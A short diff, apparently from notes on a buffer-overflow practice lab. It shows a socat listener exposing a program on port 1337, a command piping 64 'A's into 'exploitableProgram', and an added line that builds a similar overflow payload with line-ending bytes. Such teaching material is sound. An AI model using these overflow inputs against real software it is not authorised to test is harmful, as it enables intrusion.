@@ -11,6 +11,7 @@ $ > sudo socat TCP-LISTEN:1337,nodelay,reuseaddr,fork EXEC:"stdbuf -i0 -o0 -e0 .
 ```bash
 
 $ python -c 'print "A"*(16*4)' | ./exploitableProgram
+$ export MYVAR=`python -c 'print "A"*64 + chr(0x0a) + chr(0x0d) + chr(0x0a) + chr (0x0d)'`
 
 ```
 
